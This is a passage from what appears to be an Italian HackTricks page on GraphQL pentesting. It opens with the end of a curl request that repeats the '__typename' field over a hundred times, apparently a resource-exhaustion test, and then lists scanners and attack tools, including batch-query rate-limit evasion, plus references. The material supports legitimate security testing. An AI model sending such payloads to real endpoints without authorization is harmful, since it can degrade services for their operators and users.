\n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n__typename \n} ", "operationName": "cop"}' \
'https://example.com/graphql'
```
## Strumenti

### Scanner di vulnerabilità

- [https://github.com/dolevf/graphql-cop](https://github.com/dolevf/graphql-cop): Testa le configurazioni errate comuni degli endpoint graphql
- [https://github.com/assetnote/batchql](https://github.com/assetnote/batchql): Script di auditing della sicurezza GraphQL con un focus sull'esecuzione di query e mutazioni batch GraphQL.
- [https://github.com/dolevf/graphw00f](https://github.com/dolevf/graphw00f): Fingerprint del graphql in uso
- [https://github.com/gsmith257-cyber/GraphCrawler](https://github.com/gsmith257-cyber/GraphCrawler): Toolkit che può essere utilizzato per acquisire schemi e cercare dati sensibili, testare autorizzazioni, forzare schemi e trovare percorsi per un dato tipo.
- [https://blog.doyensec.com/2020/03/26/graphql-scanner.html](https://blog.doyensec.com/2020/03/26/graphql-scanner.html): Può essere utilizzato come standalone o [estensione Burp](https://github.com/doyensec/inql).
- [https://github.com/swisskyrepo/GraphQLmap](https://github.com/swisskyrepo/GraphQLmap): Può essere utilizzato anche come client CLI per automatizzare attacchi
- [https://gitlab.com/dee-see/graphql-path-enum](https://gitlab.com/dee-see/graphql-path-enum): Strumento che elenca i diversi modi di **raggiungere un dato tipo in uno schema GraphQL**.
- [https://github.com/doyensec/GQLSpection](https://github.com/doyensec/GQLSpection): Il successore delle modalità Standalone e CLI di InQL
- [https://github.com/doyensec/inql](https://github.com/doyensec/inql): Estensione Burp per test avanzati di GraphQL. Lo _**Scanner**_ è il nucleo di InQL v5.0, dove puoi analizzare un endpoint GraphQL o un file di schema di introspezione locale. Genera automaticamente tutte le possibili query e mutazioni, organizzandole in una vista strutturata per la tua analisi. Il componente _**Attacker**_ ti consente di eseguire attacchi batch GraphQL, che possono essere utili per eludere limiti di velocità mal implementati.
- [https://github.com/nikitastupin/clairvoyance](https://github.com/nikitastupin/clairvoyance): Prova a ottenere lo schema anche con l'introspezione disabilitata utilizzando l'aiuto di alcuni database Graphql che suggeriranno i nomi delle mutazioni e dei parametri.

### Client

- [https://github.com/graphql/graphiql](https://github.com/graphql/graphiql): Client GUI
- [https://altair.sirmuel.design/](https://altair.sirmuel.design/): Client GUI

### Test automatici

{{#ref}}
https://graphql-dashboard.herokuapp.com/
{{#endref}}

- Video che spiega AutoGraphQL: [https://www.youtube.com/watch?v=JJmufWfVvyU](https://www.youtube.com/watch?v=JJmufWfVvyU)

## Riferimenti

- [**https://jondow.eu/practical-graphql-attack-vectors/**](https://jondow.eu/practical-graphql-attack-vectors/)
- [**https://medium.com/@the.bilal.rizwan/graphql-common-vulnerabilities-how-to-exploit-them-464f9fdce696**](https://medium.com/@the.bilal.rizwan/graphql-common-vulnerabilities-how-to-exploit-them-464f9fdce696)
- [**https://medium.com/@apkash8/graphql-vs-rest-api-model-common-security-test-cases-for-graphql-endpoints-5b723b1468b4**](https://medium.com/@apkash8/graphql-vs-rest-api-model-common-security-test-cases-for-graphql-endpoints-5b723b1468b4)
- [**http://ghostlulz.com/api-hacking-graphql/**](http://ghostlulz.com/api-hacking-graphql/)
- [**https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/GraphQL%20Injection/README.md**](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/GraphQL%20Injection/README.md)
- [**https://medium.com/@the.bilal.rizwan/graphql-common-vulnerabilities-how-to-exploit-them-464f9fdce696**](https://medium.com/@the.bilal.rizwan/graphql-common-vulnerabilities-how-to-exploit-them-464f9fdce696)
- [**https://portswigger.net/web-security/graphql**](https://portswigger.net/web-security/graphql)

{{#include ../../banners/hacktricks-training.md}}
